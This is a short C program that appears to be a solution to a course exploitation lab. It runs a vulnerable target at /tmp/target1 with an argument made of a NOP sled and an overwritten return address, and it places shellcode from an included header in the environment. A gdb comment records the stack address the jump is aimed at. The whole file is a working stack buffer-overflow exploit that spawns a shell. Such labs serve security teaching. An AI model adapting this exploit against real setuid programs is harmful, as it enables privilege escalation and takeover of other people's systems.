#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target1"

int main(void)
{
  char *args[3]; 
  char *env[1];

  args[0] = TARGET;
  args[1] = "\x90\x90\x90\x90\x90\x90\x90\x90\x19\xd7\xff\xff";
  // (gdb) x/x *(char**)environ
  // 0xbfffff9f:	0xdb31c031
  args[2] = NULL;
  
  env[0] = shellcode;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}